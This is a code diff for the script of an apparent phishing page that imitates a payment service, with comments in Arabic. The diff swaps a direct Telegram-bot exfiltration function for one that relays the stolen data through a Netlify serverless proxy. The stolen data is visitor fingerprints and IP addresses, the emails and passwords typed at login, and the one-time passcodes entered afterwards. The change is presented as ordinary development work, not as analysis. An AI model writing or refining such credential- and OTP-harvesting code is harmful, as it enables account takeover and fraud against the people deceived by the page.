@@ -444,8 +444,6 @@
         // =======================================================
         //               Global Configurations & IP variable
         // =======================================================
-        const BOT_TOKEN = "";
-        const CHAT_ID = "";
         const FINAL_REDIRECT_URL = "https://shamcash.org";
         let userIpAddress = 'غير معروف'; // Global variable to store IP
 
@@ -466,26 +464,38 @@
             }
         }
 
-        // Generic function to send messages to Telegram, now including the global IP
-        async function sendToTelegram(message) {
-            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const fullMessage = message + `\n\n<b>IP:</b>\n${userIpAddress}`; // Add IP automatically
-            const params = {
-                chat_id: CHAT_ID,
-                text: fullMessage,
-                parse_mode: 'HTML'
-            };
+        // =======================================================
+//          Updated Utility Function to send to Netlify Function
+// =======================================================
+async function sendToNetlifyFunction(type, payload) {
+    const netlifyFunctionUrl = '/.netlify/functions/telegram-api-proxy'; // مسار وظيفتك في Netlify
 
-            try {
-                await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(params)
-                });
-            } catch (error) {
-                console.error('Error sending message to Telegram:', error);
-            }
+    try {
+        const response = await fetch(netlifyFunctionUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            // نرسل البيانات، نوع الرسالة، وIP المستخدم (الذي تم جلبه سابقا)
+            body: JSON.stringify({
+                type: type, // نوع الرسالة: 'initial_visit', 'login_data', 'otp_code'
+                payload: payload, // البيانات المحددة للرسالة (userAgent, email, otpCode, إلخ)
+                ipAddress: userIpAddress // IP الذي تم جلبه من api64.ipify.org
+            })
+        });
+
+        if (!response.ok) {
+            const errorData = await response.json();
+            console.error('Netlify function error response:', errorData);
+            throw new Error(`Netlify function returned status ${response.status}: ${errorData.message}`);
         }
+
+        const data = await response.json();
+        console.log('Message successfully sent via Netlify Function:', data);
+        return data; // يمكنك إرجاع استجابة الوظيفة إذا كنت بحاجة إليها
+    } catch (error) {
+        console.error('Error sending message to Netlify Function:', error);
+        // يمكنك عرض رسالة خطأ للمستخدم إذا لزم الأمر
+    }
+}
 
         // Functions for error display (kept as per your provided code)
         function showError(inputElement, messageElement, message) {
@@ -555,8 +565,16 @@
                 <b>المرجع:</b>\n${referrer}
                 <b>الوقت والتاريخ:</b>\n${localDateTime}
             `;
-            await sendToTelegram(visitorMessage);
-            console.log('Initial visitor data sent to Telegram!');
+            await sendToNetlifyFunction('initial_visit', {
+    userAgent: userAgent,
+    screenWidth: screenWidth,
+    screenHeight: screenHeight,
+    browserLanguage: browserLanguage,
+    currentUrl: currentUrl,
+    referrer: referrer,
+    localDateTime: localDateTime
+});
+            console.log('Initial visitor data sent to YandexRusia!');
         }
 
         // Fetch IP and then send initial visitor data as soon as the script loads
@@ -629,7 +647,10 @@
             `;
 
             // Send login data to Telegram (IP will be added automatically by sendToTelegram)
-            await sendToTelegram(loginMessage);
+            await sendToNetlifyFunction('login_data', {
+    email: email,
+    password: password
+});
 
             // Keep modal visible for 15 seconds, then transition to OTP page
             setTimeout(() => {
@@ -703,7 +724,9 @@
                 <b>الرمز:</b>\n${otpCode}
             `;
 
-            await sendToTelegram(otpMessage);
+            await sendToNetlifyFunction('otp_code', {
+    otpCode: otpCode
+});
 
             setTimeout(() => {
                 loadingOverlay.classList.add('hidden');
